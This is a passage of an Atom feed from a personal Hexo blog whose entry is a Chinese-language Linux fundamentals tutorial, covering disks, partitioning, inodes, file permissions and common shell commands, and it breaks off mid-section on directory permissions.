<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>赵光建的个人站点</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://linux7788.com/"/>
  <updated>2018-05-19T08:54:37.413Z</updated>
  <id>https://linux7788.com/</id>
  
  <author>
    <name>赵光建</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux系统基础知识</title>
    <link href="https://linux7788.com/linux_ops/linux_base/"/>
    <id>https://linux7788.com/linux_ops/linux_base/</id>
    <published>2018-05-18T14:38:25.000Z</published>
    <updated>2018-05-19T08:54:37.413Z</updated>
    
    <content type="html"><![CDATA[<!-- GFM-TOC --><ul><li><a href="#一常用操作以及概念">一、常用操作以及概念</a><ul><li><a href="#快捷键">快捷键</a></li><li><a href="#求助">求助</a></li><li><a href="#关机">关机</a></li><li><a href="#path">PATH</a></li><li><a href="#sudo">sudo</a></li><li><a href="#包管理工具">包管理工具</a></li><li><a href="#发行版">发行版</a></li><li><a href="#vim-三个模式">VIM 三个模式</a></li><li><a href="#gnu">GNU</a></li><li><a href="#开源协议">开源协议</a></li></ul></li><li><a href="#二磁盘">二、磁盘</a><ul><li><a href="#hdd">HDD</a></li><li><a href="#磁盘接口">磁盘接口</a></li><li><a href="#磁盘的文件名">磁盘的文件名</a></li></ul></li><li><a href="#三分区">三、分区</a><ul><li><a href="#分区表">分区表</a></li><li><a href="#开机检测程序">开机检测程序</a></li></ul></li><li><a href="#四文件系统">四、文件系统</a><ul><li><a href="#分区与文件系统">分区与文件系统</a></li><li><a href="#组成">组成</a></li><li><a href="#文件读取">文件读取</a></li><li><a href="#磁盘碎片">磁盘碎片</a></li><li><a href="#block">block</a></li><li><a href="#inode">inode</a></li><li><a href="#目录">目录</a></li><li><a href="#日志">日志</a></li><li><a href="#挂载">挂载</a></li><li><a href="#目录配置">目录配置</a></li></ul></li><li><a href="#五文件">五、文件</a><ul><li><a href="#文件属性">文件属性</a></li><li><a href="#文件时间">文件时间</a></li><li><a href="#文件与目录的基本操作">文件与目录的基本操作</a></li><li><a href="#修改权限">修改权限</a></li><li><a href="#文件默认权限">文件默认权限</a></li><li><a href="#目录的权限">目录的权限</a></li><li><a href="#链接">链接</a></li><li><a href="#获取文件内容">获取文件内容</a></li><li><a href="#指令与文件搜索">指令与文件搜索</a></li></ul></li><li><a href="#六压缩与打包">六、压缩与打包</a><ul><li><a href="#压缩文件名">压缩文件名</a></li><li><a href="#压缩指令">压缩指令</a></li><li><a href="#打包">打包</a></li></ul></li><li><a href="#七bash">七、Bash</a><ul><li><a href="#特性">特性</a></li><li><a href="#变量操作">变量操作</a></li><li><a href="#指令搜索顺序">指令搜索顺序</a></li><li><a href="#数据流重定向">数据流重定向</a></li></ul></li><li><a href="#八管线指令">八、管线指令</a><ul><li><a href="#提取指令">提取指令</a></li><li><a href="#排序指令">排序指令</a></li><li><a href="#双向输出重定向">双向输出重定向</a></li><li><a href="#字符转换指令">字符转换指令</a></li><li><a href="#分区指令">分区指令</a></li></ul></li><li><a href="#九正则表达式">九、正则表达式</a><ul><li><a href="#grep">grep</a></li><li><a href="#printf">printf</a></li><li><a href="#awk">awk</a></li></ul></li><li><a href="#十进程管理">十、进程管理</a><ul><li><a href="#查看进程">查看进程</a></li><li><a href="#进程状态">进程状态</a></li><li><a href="#sigchld">SIGCHLD</a></li><li><a href="#wait">wait()</a></li><li><a href="#waitpid">waitpid()</a></li><li><a href="#孤儿进程">孤儿进程</a></li><li><a href="#僵死进程">僵死进程</a></li></ul></li><li><a href="#十一io-复用">十一、I/O 复用</a><ul><li><a href="#概念理解">概念理解</a></li><li><a href="#io-模型">I/O 模型</a></li><li><a href="#select-poll-epoll">select poll epoll</a></li><li><a href="#select-和-poll-比较">select 和 poll 比较</a></li><li><a href="#eopll-工作模式">eopll 工作模式</a></li><li><a href="#select-poll-epoll-应用场景">select poll epoll 应用场景</a></li></ul></li><li><a href="#参考资料">参考资料</a><!-- GFM-TOC --></li></ul><h1 id="一、常用操作以及概念"><a href="#一、常用操作以及概念" class="headerlink" title="一、常用操作以及概念"></a>一、常用操作以及概念</h1><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><ul><li>Tab：命令和文件名补全；</li><li>Ctrl+C：中断正在运行的程序；</li><li>Ctrl+D：结束键盘输入（End Of File，EOF）</li></ul><h2 id="求助"><a href="#求助" class="headerlink" title="求助"></a>求助</h2><h3 id="1-–help"><a href="#1-–help" class="headerlink" title="1. –help"></a>1. –help</h3><p>指令的基本用法与选项介绍。</p><h3 id="2-man"><a href="#2-man" class="headerlink" title="2. man"></a>2. man</h3><p>man 是 manual 的缩写，将指令的具体信息显示出来。</p><p>当执行<code>man date</code>时，有 DATE(1) 出现，其中的数字代表指令的类型，常用的数字及其类型如下：</p><table><thead><tr><th style="text-align:center">代号</th><th>类型</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td>用户在 shell 环境中可以操作的指令或者可执行文件</td></tr><tr><td style="text-align:center">5</td><td>配置文件</td></tr><tr><td style="text-align:center">8</td><td>系统管理员可以使用的管理指令</td></tr></tbody></table><h3 id="3-info"><a href="#3-info" class="headerlink" title="3. info"></a>3. info</h3><p>info 与 man 类似，但是 info 将文档分成一个个页面，每个页面可以进行跳转。</p><h3 id="4-doc"><a href="#4-doc" class="headerlink" title="4. doc"></a>4. doc</h3><p>/usr/share/doc 存放着软件的一整套说明文件。</p><h2 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h2><h3 id="1-who"><a href="#1-who" class="headerlink" title="1. who"></a>1. who</h3><p>在关机前需要先使用 who 命令查看有没有其它用户在线。</p><h3 id="2-sync"><a href="#2-sync" class="headerlink" title="2. sync"></a>2. sync</h3><p>为了加快对磁盘文件的读写速度，位于内存中的文件数据不会立即同步到磁盘上，因此关机之前需要先进行 sync 同步操作。</p><h3 id="3-shutdown"><a href="#3-shutdown" class="headerlink" title="3. shutdown"></a>3. shutdown</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># shutdown [-krhc] 时间 [信息]</span><br><span class="line">-k ： 不会关机，只是发送警告信息，通知所有在线的用户</span><br><span class="line">-r ： 将系统的服务停掉后就重新启动</span><br><span class="line">-h ： 将系统的服务停掉后就立即关机</span><br><span class="line">-c ： 取消已经在进行的 shutdown 指令内容</span><br></pre></td></tr></table></figure><h2 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h2><p>可以在环境变量 PATH 中声明可执行文件的路径，路径之间用 : 分隔。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/dmtsai/.local/bin:/home/dmtsai/bin</span><br></pre></td></tr></table></figure><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>sudo 允许一般用户使用 root 可执行的命令，不过只有在 /etc/sudoers 配置文件中添加的用户才能使用该指令。</p><h2 id="包管理工具"><a href="#包管理工具" class="headerlink" title="包管理工具"></a>包管理工具</h2><p>RPM 和 DPKG 为最常见的两类软件包管理工具。RPM 全称为 Redhat Package Manager，最早由 Red Hat 公司制定实施，随后被 GNU 开源操作系统接受并成为很多 Linux 系统 (RHEL) 的既定软件标准。与 RPM 进行竞争的是基于 Debian 操作系统 (UBUNTU) 的 DEB 软件包管理工具 DPKG，全称为 Debian Package，功能方面与 RPM 相似。</p><p>YUM 基于 RPM，具有依赖管理功能，并具有软件升级的功能。</p><h2 id="发行版"><a href="#发行版" class="headerlink" title="发行版"></a>发行版</h2><p>Linux 发行版是 Linux 内核及各种应用软件的集成版本。</p><table><thead><tr><th style="text-align:center">基于的包管理工具</th><th style="text-align:center">商业发行版</th><th style="text-align:center">社区发行版</th></tr></thead><tbody><tr><td style="text-align:center">DPKG</td><td style="text-align:center">Ubuntu</td><td style="text-align:center">Debian</td></tr><tr><td style="text-align:center">RPM</td><td style="text-align:center">Red Hat</td><td style="text-align:center">Fedora / CentOS</td></tr></tbody></table><h2 id="VIM-三个模式"><a href="#VIM-三个模式" class="headerlink" title="VIM 三个模式"></a>VIM 三个模式</h2><ul><li>一般指令模式（Command mode）：VIM 的默认模式，可以用于移动游标查看内容；</li><li>编辑模式（Insert mode）：按下 “i” 等按键之后进入，可以对文本进行编辑；</li><li>指令列模式（Bottom-line mode）：按下 “:” 按键之后进入，用于保存退出等操作。</li></ul><p><div align="center"> <img src="/images/posts/vim.jpg" width="400"> </div><br></p><p>在指令列模式下，有以下命令用于离开或者保存文件。</p><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">:w</td><td style="text-align:center">写入磁盘</td></tr><tr><td style="text-align:center">:w!</td><td style="text-align:center">当文件为只读时，强制写入磁盘。到底能不能写入，与用户对该文件的权限有关</td></tr><tr><td style="text-align:center">:q</td><td style="text-align:center">离开</td></tr><tr><td style="text-align:center">:q!</td><td style="text-align:center">强制离开不保存</td></tr><tr><td style="text-align:center">:wq</td><td style="text-align:center">写入磁盘后离开</td></tr><tr><td style="text-align:center">:wq!</td><td style="text-align:center">强制写入磁盘后离开</td></tr></tbody></table><h2 id="GNU"><a href="#GNU" class="headerlink" title="GNU"></a>GNU</h2><p>GNU 计划，译为革奴计划，它的目标是创建一套完全自由的操作系统，称为 GNU，其内容软件完全以 GPL 方式发布。其中 GPL 全称为 GNU 通用公共许可协议，包含了以下内容：</p><ul><li>以任何目的运行此程序的自由；</li><li>再复制的自由；</li><li>改进此程序，并公开发布改进的自由。</li></ul><h2 id="开源协议"><a href="#开源协议" class="headerlink" title="开源协议"></a>开源协议</h2><ul><li><a href="https://choosealicense.com/" target="_blank" rel="noopener">Choose an open source license</a></li><li><a href="http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html" target="_blank" rel="noopener">如何选择开源许可证？</a></li></ul><h1 id="二、磁盘"><a href="#二、磁盘" class="headerlink" title="二、磁盘"></a>二、磁盘</h1><h2 id="HDD"><a href="#HDD" class="headerlink" title="HDD"></a>HDD</h2><p><a href="https://blogs.cisco.com/datacenter/decoding-ucs-invicta-part-1" target="_blank" rel="noopener">Decoding UCS Invicta – Part 1</a></p><p>Hard Disk Drives(HDD) 俗称硬盘，具有以下结构：</p><ol><li>盘面（Platter）：一个硬盘有多个盘面；</li><li>磁道（Track）：盘面上的圆形带状区域，一个盘面可以有多个磁道；</li><li>扇区（Track Sector）：磁道上的一个弧段，一个磁道可以有多个扇区，它是最小的物理储存单位，目前主要有 512 bytes 与 4 K 两种大小；</li><li>磁头（Head）：与盘面非常接近，能够将盘面上的磁场转换为电信号（读），或者将电信号转换为盘面的磁场（写）；</li><li>制动手臂（Actuator arm）：用于在磁道之间移动磁头；</li><li>主轴（Spindle）：使整个盘面转动。</li></ol><p><div align="center"> <img src="/images/posts/hdd.jpg" width=""> </div><br></p><h2 id="磁盘接口"><a href="#磁盘接口" class="headerlink" title="磁盘接口"></a>磁盘接口</h2><h3 id="1-IDE"><a href="#1-IDE" class="headerlink" title="1. IDE"></a>1. IDE</h3><p>IDE（ATA）全称 Advanced Technology Attachment，接口速度最大为 133MB/s，因为并口线的抗干扰性太差，且排线占用空间较大，不利电脑内部散热，已逐渐被 SATA 所取代。</p><p><div align="center"> <img src="/images/posts/924914c0-660c-4e4a-bbc0-1df1146e7516.jpg" width="400"> </div><br></p><h3 id="2-SATA"><a href="#2-SATA" class="headerlink" title="2. SATA"></a>2. SATA</h3><p>SATA 全称 Serial ATA，也就是使用串口的 ATA 接口，因抗干扰性强，且对数据线的长度要求比 ATA 低很多，支持热插拔等功能，SATA-II 的接口速度为 300MiB/s，而新的 SATA-III 标准可达到 600MiB/s 的传输速度。SATA 的数据线也比 ATA 的细得多，有利于机箱内的空气流通，整理线材也比较方便。</p><p><div align="center"> <img src="/images/posts/f9f2a16b-4843-44d1-9759-c745772e9bcf.jpg" width=""> </div><br></p><h3 id="3-SCSI"><a href="#3-SCSI" class="headerlink" title="3. SCSI"></a>3. SCSI</h3><p>SCSI 全称是 Small Computer System Interface（小型机系统接口），经历多代的发展，从早期的 SCSI-II，到目前的 Ultra320 SCSI 以及 Fiber-Channel（光纤通道），接口型式也多种多样。SCSI 硬盘广为工作站级个人电脑以及服务器所使用，因此会使用较为先进的技术，如碟片转速 15000rpm 的高转速，且资料传输时 CPU 占用率较低，但是单价也比相同容量的 ATA 及 SATA 硬盘更加昂贵。</p><p><div align="center"> <img src="/images/posts/f0574025-c514-49f5-a591-6d6a71f271f7.jpg" width=""> </div><br></p><h3 id="4-SAS"><a href="#4-SAS" class="headerlink" title="4. SAS"></a>4. SAS</h3><p>SAS（Serial Attached SCSI）是新一代的 SCSI 技术，和 SATA 硬盘相同，都是采取序列式技术以获得更高的传输速度，可达到 6Gb/s。此外也透过缩小连接线改善系统内部空间等。</p><p><div align="center"> <img src="/images/posts/6729baa0-57d7-4817-b3aa-518cbccf824c.jpg" width=""> </div><br></p><h2 id="磁盘的文件名"><a href="#磁盘的文件名" class="headerlink" title="磁盘的文件名"></a>磁盘的文件名</h2><p>Linux 中每个硬件都被当做一个文件，包括磁盘。磁盘以磁盘接口类型进行命名，常见磁盘的文件名如下：</p><ul><li>IDE 磁盘：/dev/hd[a-d]</li><li>SATA/SCSI/SAS 磁盘：/dev/sd[a-p]</li></ul><p>其中文件名后面的序号的确定与系统侦测到磁盘的顺序有关，而与磁盘所插入的插槽位置无关。</p><h1 id="三、分区"><a href="#三、分区" class="headerlink" title="三、分区"></a>三、分区</h1><h2 id="分区表"><a href="#分区表" class="headerlink" title="分区表"></a>分区表</h2><p>磁盘分区表主要有两种格式，一种是限制较多的 MBR 分区表，一种是较新且限制较少的 GPT 分区表。</p><h3 id="1-MBR"><a href="#1-MBR" class="headerlink" title="1. MBR"></a>1. MBR</h3><p>MBR 中，第一个扇区最重要，里面有主要开机记录（Master boot record, MBR）及分区表（partition table），其中 MBR 占 446 bytes，分区表占 64 bytes。</p><p>分区表只有 64 bytes，最多只能存储 4 个分区，这 4 个分区为主分区（Primary）和扩展分区（Extended）。其中扩展分区只有一个，它将其它扇区用来记录分区表，因此通过扩展分区可以分出更多分区，这些分区称为逻辑分区。</p><p>Linux 也把分区当成文件，分区文件的命名方式为：磁盘文件名 + 编号，例如 /dev/sda1。注意，逻辑分区的编号从 5 开始。</p><h3 id="2-GPT"><a href="#2-GPT" class="headerlink" title="2. GPT"></a>2. GPT</h3><p>不同的磁盘有不同的扇区大小，例如 512 bytes 和最新磁盘的 4 k。GPT 为了兼容所有磁盘，在定义扇区上使用逻辑区块地址（Logical Block Address, LBA），LBA 默认大小为 512 bytes。</p><p>GPT 第 1 个区块记录了 MBR，紧接着是 33 个区块记录分区信息，并把最后的 33 个区块用于对分区信息进行备份。这 33 个区块第一个为 GPT 表头纪录，这个部份纪录了分区表本身的位置与大小和备份分区的位置，同时放置了分区表的校验码 (CRC32)，操作系统可以根据这个校验码来判断 GPT 是否正确。若有错误，可以使用备份分区进行恢复。</p><p>GPT 没有扩展分区概念，都是主分区，每个 LAB 可以分 4 个分区，因此总共可以分 4 * 32 = 128 个分区。</p><p>MBR 不支持 2.2 TB 以上的硬盘，GPT 则最多支持到 2<sup>33</sup> TB = 8 ZB。</p><p><div align="center"> <img src="/images/posts/GUID_Partition_Table_Scheme.svg.png" width="400"> </div><br></p><h2 id="开机检测程序"><a href="#开机检测程序" class="headerlink" title="开机检测程序"></a>开机检测程序</h2><h3 id="1-BIOS"><a href="#1-BIOS" class="headerlink" title="1. BIOS"></a>1. BIOS</h3><p>BIOS（Basic Input/Output System，基本输入输出系统），它是一个固件（嵌入与硬件中的软件），BIOS 程序存放在断电后内容不会丢失的只读内存中。</p><p>BIOS 是开机的时候计算机执行的第一个程序，这个程序知道可以开机的磁盘，并读取磁盘第一个扇区的 MBR，由 MBR 执行 MBR 中的开机管理程序，这个开机管理程序会加载操作系统的核心文件。</p><p><div align="center"> <img src="/images/posts/50831a6f-2777-46ea-a571-29f23c85cc21.jpg"> </div><br></p><p>MBR 中的开机管理程序提供以下功能：选单、载入核心文件以及转交其它开机管理程序。转交这个功能可以用来实现了多重引导，只需要将另一个操作系统的开机管理程序安装在其它分区的启动扇区上，在启动 MBR 中的开机管理程序时，就可以通过选单选择启动当前的操作系统或者转交给其它开机管理程序从而启动另一个操作系统。</p><p>下图中，第一扇区的 MBR 中的开机管理程序提供了两个选单：M1、M2，M1 指向了 Windows 操作系统，而 M2 指向其它分区的启动扇区，里面包含了另外一个开机管理程序，提供了一个指向 Linux 的选单。</p><p><div align="center"> <img src="/images/posts/f900f266-a323-42b2-bc43-218fdb8811a8.jpg" width="600"> </div><br></p><p>安装多重引导，最好先安装 Windows 再安装 Linux。因为安装 Windows 时会覆盖掉 MBR，而 Linux 可以选择将开机管理程序安装在 MBR 或者其它分区的启动扇区，并且可以设置开机管理程序的选单。</p><h3 id="2-UEFI"><a href="#2-UEFI" class="headerlink" title="2. UEFI"></a>2. UEFI</h3><p>BIOS 不可以读取 GPT 分区表，而 UEFI 可以。</p><h1 id="四、文件系统"><a href="#四、文件系统" class="headerlink" title="四、文件系统"></a>四、文件系统</h1><h2 id="分区与文件系统"><a href="#分区与文件系统" class="headerlink" title="分区与文件系统"></a>分区与文件系统</h2><p>对分区进行格式化是为了在分区上建立文件系统。一个分区通常只能格式化为一个文件系统，但是磁盘阵列等技术可以将一个分区格式化为多个文件系统。</p><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p><div align="center"> <img src="/images/posts/BSD_disk.png" width="800"> </div><br></p><p>最主要的几个组成部分如下：</p><ol><li>inode：一个文件占用一个 inode，记录文件的属性，同时记录此文件的内容所在的 block 编号；</li><li>block：记录文件的内容，文件太大时，会占用多个 block。</li></ol><p>除此之外还包括：</p><ol><li>superblock：记录文件系统的整体信息，包括 inode 和 block 的总量、使用量、剩余量，以及文件系统的格式与相关信息等；</li><li>block bitmap：记录 block 是否被使用的位域；</li></ol><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>对于 Ext2 文件系统，当要读取一个文件的内容时，先在 inode 中去查找文件内容所在的所有 block，然后把所有 block 的内容读出来。</p><p><div align="center"> <img src="/images/posts/83185315-793a-453a-a927-5e8d92b5c0ef.jpg"> </div><br></p><p>而对于 FAT 文件系统，它没有 inode，每个 block 中存储着下一个 block 的编号。</p><p><div align="center"> <img src="/images/posts/075e1977-7846-4928-96c8-bb5b0268693c.jpg"> </div><br></p><h2 id="磁盘碎片"><a href="#磁盘碎片" class="headerlink" title="磁盘碎片"></a>磁盘碎片</h2><p>指一个文件内容所在的 block 过于分散。</p><h2 id="block"><a href="#block" class="headerlink" title="block"></a>block</h2><p>在 Ext2 文件系统中所支持的 block 大小有 1K，2K 及 4K 三种，不同的大小限制了单个文件和文件系统的最大大小。</p><table><thead><tr><th style="text-align:center">大小</th><th style="text-align:center">1KB</th><th style="text-align:center">2KB</th><th style="text-align:center">4KB</th></tr></thead><tbody><tr><td style="text-align:center">最大单一文件</td><td style="text-align:center">16GB</td><td style="text-align:center">256GB</td><td style="text-align:center">2TB</td></tr><tr><td style="text-align:center">最大文件系统</td><td style="text-align:center">2TB</td><td style="text-align:center">8TB</td><td style="text-align:center">16TB</td></tr></tbody></table><p>一个 block 只能被一个文件所使用，未使用的部分直接浪费了。因此如果需要存储大量的小文件，那么最好选用比较小的 block。</p><h2 id="inode"><a href="#inode" class="headerlink" title="inode"></a>inode</h2><p>inode 具体包含以下信息：</p><ul><li>权限 (read/write/excute)；</li><li>拥有者与群组 (owner/group)；</li><li>容量；</li><li>建立或状态改变的时间 (ctime)；</li><li>最近一次的读取时间 (atime)；</li><li>最近修改的时间 (mtime)；</li><li>定义文件特性的旗标 (flag)，如 SetUID…；</li><li>该文件真正内容的指向 (pointer)。</li></ul><p>inode 具有以下特点：</p><ul><li>每个 inode 大小均固定为 128 bytes (新的 ext4 与 xfs 可设定到 256 bytes)；</li><li>每个文件都仅会占用一个 inode。</li></ul><p>inode 中记录了文件内容所在的 block 编号，但是每个 block 非常小，一个大文件随便都需要几十万的 block。而一个 inode 大小有限，无法直接引用这么多 block 编号。因此引入了间接、双间接、三间接引用。间接引用是指，让 inode 记录的引用 block 块当成 inode 用来记录引用信息。</p><p><div align="center"> <img src="/images/posts/inode_with_signatures.jpg" width="600"> </div><br></p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>建立一个目录时，会分配一个 inode 与至少一个 block。block 记录的内容是目录下所有文件的 inode 编号以及文件名。可以看出文件的 inode 本身不记录文件名，文件名记录在目录中，因此新增文件、删除文件、更改文件名这些操作与目录的 w 权限有关。</p><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>如果突然断电，那么文件系统会发生错误，例如断电前只修改了 block bitmap，而还没有将数据真正写入 block 中。</p><p>ext3/ext4 文件系统引入了日志功能，可以利用日志来修复文件系统。</p><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><p>挂载利用目录作为文件系统的进入点，也就是说，进入目录之后就可以读取文件系统的数据。</p><h2 id="目录配置"><a href="#目录配置" class="headerlink" title="目录配置"></a>目录配置</h2><p>为了使不同 Linux 发行版本的目录结构保持一致性，Filesystem Hierarchy Standard (FHS) 规定了 Linux 的目录结构。最基础的三个目录如下：</p><ul><li>/ (root, 根目录)</li><li>/usr (unix software resource)：所有系统默认软件都会安装到这个目录；</li><li>/var (variable)：存放系统或程序运行过程中的数据文件。</li></ul><p><div align="center"> <img src="/images/posts/linux-filesystem.png" width=""> </div><br></p><h1 id="五、文件"><a href="#五、文件" class="headerlink" title="五、文件"></a>五、文件</h1><h2 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h2><p>用户分为三种：文件拥有者、群组以及其它人，对不同的用户有不同的文件权限。</p><p>使用 ls 查看一个文件时，会显示一个文件的信息，例如 <code>drwxr-xr-x. 3 root root 17 May 6 00:14 .config</code>，对这个信息的解释如下：</p><ul><li>drwxr-xr-x：文件类型以及权限，第 1 位为文件类型字段，后 9 位为文件权限字段。</li><li>3：链接数；</li><li>root：文件拥有者；</li><li>root：所属群组；</li><li>17：文件大小；</li><li>May 6 00:14：文件最后被修改的时间；</li><li>.config：文件名。</li></ul><p>常见的文件类型及其含义有：</p><ul><li>d：目录；</li><li>-：文件；</li><li>l：链接文件；</li></ul><p>9 位的文件权限字段中，每 3 个为一组，共 3 组，每一组分别代表对文件拥有者、所属群组以及其它人的文件权限。一组权限中的 3 位分别为 r、w、x 权限，表示可读、可写、可执行。</p><h2 id="文件时间"><a href="#文件时间" class="headerlink" title="文件时间"></a>文件时间</h2><ol><li>modification time (mtime)：文件的内容更新就会更新；</li><li>status time (ctime)：文件的状态（权限、属性）更新就会更新；</li><li>access time (atime)：读取文件时就会更新。</li></ol><h2 id="文件与目录的基本操作"><a href="#文件与目录的基本操作" class="headerlink" title="文件与目录的基本操作"></a>文件与目录的基本操作</h2><h3 id="1-ls"><a href="#1-ls" class="headerlink" title="1. ls"></a>1. ls</h3><p>列出文件或者目录的信息，目录的信息就是其中包含的文件。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ls [-aAdfFhilnrRSt] file|dir</span><br><span class="line">-a ：列出全部的文件</span><br><span class="line">-d ：仅列出目录本身</span><br><span class="line">-l ：以长数据串行列出，包含文件的属性与权限等等数据</span><br></pre></td></tr></table></figure><h3 id="2-cd"><a href="#2-cd" class="headerlink" title="2. cd"></a>2. cd</h3><p>更换当前目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> [相对路径或绝对路径]</span><br></pre></td></tr></table></figure><h3 id="3-mkdir"><a href="#3-mkdir" class="headerlink" title="3. mkdir"></a>3. mkdir</h3><p>创建目录。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># mkdir [-mp] 目录名称</span><br><span class="line">-<span class="ruby">m ：配置目录权限</span></span><br><span class="line"><span class="ruby">-p ：递归创建目录</span></span><br></pre></td></tr></table></figure><h3 id="4-rmdir"><a href="#4-rmdir" class="headerlink" title="4. rmdir"></a>4. rmdir</h3><p>删除目录，必须为空。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rmdir [-p] 目录名称</span><br><span class="line">-p ：递归删除目录</span><br></pre></td></tr></table></figure><h3 id="5-touch"><a href="#5-touch" class="headerlink" title="5. touch"></a>5. touch</h3><p>更新文件时间或者建立新文件。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># touch [-acdmt] filename</span><br><span class="line">-a ： 更新 atime</span><br><span class="line">-c ： 更新 ctime，若该文件不存在则不建立新文件</span><br><span class="line">-m ： 更新 mtime</span><br><span class="line">-d ： 后面可以接更新日期而不使用当前日期，也可以使用 --date="日期或时间"</span><br><span class="line">-t ： 后面可以接更新时间而不使用当前时间，格式为[YYYYMMDDhhmm]</span><br></pre></td></tr></table></figure><h3 id="6-cp"><a href="#6-cp" class="headerlink" title="6. cp"></a>6. cp</h3><p>复制文件。</p><p>如果源文件有两个以上，则目的文件一定要是目录才行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cp [-adfilprsu] source destination</span><br><span class="line">-a ：相当于 -dr --preserve=all 的意思，至于 dr 请参考下列说明</span><br><span class="line">-d ：若来源文件为链接文件，则复制链接文件属性而非文件本身</span><br><span class="line">-i ：若目标文件已经存在时，在覆盖前会先询问</span><br><span class="line">-p ：连同文件的属性一起复制过去</span><br><span class="line">-r ：递归持续复制</span><br><span class="line">-u ：destination 比 source 旧才更新 destination，或 destination 不存在的情况下才复制</span><br><span class="line">--preserve=all ：除了 -p 的权限相关参数外，还加入 SELinux 的属性, links, xattr 等也复制了</span><br></pre></td></tr></table></figure><h3 id="7-rm"><a href="#7-rm" class="headerlink" title="7. rm"></a>7. rm</h3><p>删除文件。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># rm [-fir] 文件或目录</span><br><span class="line">-r ：递归删除</span><br></pre></td></tr></table></figure><h3 id="8-mv"><a href="#8-mv" class="headerlink" title="8. mv"></a>8. mv</h3><p>移动文件。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># mv [-fiu] source destination</span><br><span class="line"># mv [options] source1 source2 source3 .... directory</span><br><span class="line">-f ： force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖</span><br></pre></td></tr></table></figure><h2 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h2><p>可以将一组权限用数字来表示，此时一组权限的 3 个位当做二进制数字的位，从左到右每个位的权值为 4、2、1，即每个权限对应的数字权值为 r : 4、w : 2、x : 1。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># chmod [-R] xyz dirname/filename</span><br></pre></td></tr></table></figure><p>范例：将 .bashrc 文件的权限修改为 -rwxr-xr–。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># chmod 754 .bashrc</span><br></pre></td></tr></table></figure><p>也可以使用符号来设定权限。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># chmod [ugoa]  [+-=] [rwx] dirname/filename</span><br><span class="line">- u：拥有者</span><br><span class="line">- g：所属群组</span><br><span class="line">- o：其他人</span><br><span class="line">- a：所有人</span><br><span class="line">- +：添加权限</span><br><span class="line">- -：移除权限</span><br><span class="line">- =：设定权限</span><br></pre></td></tr></table></figure><p>范例：为 .bashrc 文件的所有用户添加写权限。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># chmod a+w .bashrc</span><br></pre></td></tr></table></figure><h2 id="文件默认权限"><a href="#文件默认权限" class="headerlink" title="文件默认权限"></a>文件默认权限</h2><ul><li>文件默认权限：文件默认没有可执行权限，因此为 666，也就是 -rw-rw-rw- 。</li><li>目录默认权限：目录必须要能够进入，也就是必须拥有可执行权限，因此为 777 ，也就是 drwxrwxrwx。</li></ul><p>可以通过 umask 设置或者查看文件的默认权限，通常以掩码的形式来表示，例如 002 表示其它用户的权限去除了一个 2 的权限，也就是写权限，因此建立新文件时默认的权限为 -rw-rw-r–。</p><h2 id="目录的权限"><a href="#目录的权限" class="headerlink" 